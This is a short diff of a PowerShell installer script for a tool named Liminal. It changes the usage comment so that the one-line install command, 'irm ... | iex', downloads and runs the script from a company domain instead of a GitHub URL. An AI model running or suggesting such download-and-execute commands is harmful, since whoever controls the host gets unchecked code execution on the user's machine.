@@ -1,5 +1,5 @@
 # Liminal one-command installer (Windows PowerShell)
-# Usage: irm https://raw.githubusercontent.com/traidy2222/liminal-ai/main/scripts/install.ps1 | iex
+# Usage: irm https://vireondynamics.com/install/install.ps1 | iex
 #Requires -Version 5.1
 
 $ErrorActionPreference = "Stop"
